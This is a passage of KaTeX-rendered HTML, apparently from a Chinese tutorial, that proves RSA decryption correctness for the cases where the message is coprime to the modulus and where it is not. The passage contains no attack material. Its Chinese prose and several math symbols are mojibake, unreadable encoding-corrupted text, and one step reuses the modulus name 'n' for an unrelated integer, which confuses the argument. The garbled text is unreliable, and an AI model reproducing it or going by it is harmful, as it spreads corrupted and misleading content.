mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><msup><mi>m</mi><mrow><mi>e</mi><mo>âˆ—</mo><mi>d</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><msup><mi>m</mi><mrow><mi>k</mi><mo>âˆ—</mo><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} c^{d}\mod{n}&amp;\equiv m^{e*d}\mod{n} \\&amp;\equiv m^{k*\varphi(n)+1}\mod{n}\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.1571em;vertical-align:-1.3286em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8286em;"><span style="top:-3.9294em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-2.3314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.3286em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8286em;"><span style="top:-3.9294em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-2.3314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.3286em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>æ­¤æ—¶è¦åˆ†æƒ…å†µè®¨è®º</p><ul><li><p>å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>äº’è´¨çš„æ—¶å€™</p><p>æœ‰<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Â </mtext><msup><mi>m</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">\ m^{\varphi(n)}=1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>åˆ™æ­¤æ—¶æœ‰</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>m</mi><mrow><mi>k</mi><mo>âˆ—</mo><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><msup><mn>1</mn><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>m</mi><mrow><mi>k</mi><mo>âˆ—</mo><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}  m^{k*\varphi(n)}&amp;\equiv1^{k}\mod{n}  \\&amp;\equiv 1\mod{n} \\m^{k*\varphi(n)+1}&amp;\equiv m\mod{n} \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.696em;vertical-align:-2.098em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.598em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.562em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.098em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.598em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-1.562em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.098em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>ä¹Ÿå°±æ˜¯è¯´<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi><mo>â‰¡</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">c^d\mod{n}\equiv m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></p></li><li><p>å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ä¸äº’è´¨çš„æ—¶å€™</p><p>ç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>&lt;</mo><mi>n</mi><mo separator="true">,</mo><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m&lt;n,n=pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>ï¼Œæ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>æˆ–è€…<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>çš„å€æ•°ï¼Œæ„ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>t</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">m=t*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œè¿™é‡Œçš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span>ä¸ºæ­£æ•´æ•°</p><p>ä¹Ÿå°±æ˜¯è¯´<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(m,p)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>ç”±è´¹é©¬å°å®šç†ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(p)}=1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>ï¼Œä¸¤è¾¹åŒæ—¶è¿›è¡Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>æ¬¡æ–¹å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)}\equiv1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>ï¼Œ</p><p>é‚£ä¹ˆå­˜åœ¨æ­£æ•´æ•°nï¼Œä½¿å¾—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mo>+</mo><mi>n</mi><mo>âˆ—</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)}=1+n*p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></p><p>ä¸¤è¾¹åŒæ—¶ä¹˜ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>t</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">m=t*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œå¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>m</mi><mo>+</mo><mi>n</mi><mi>t</mi><mo>âˆ—</mo><mi>p</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)+1}= m+nt*p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œä¹Ÿå³æ˜¯</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>â‰¡</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation 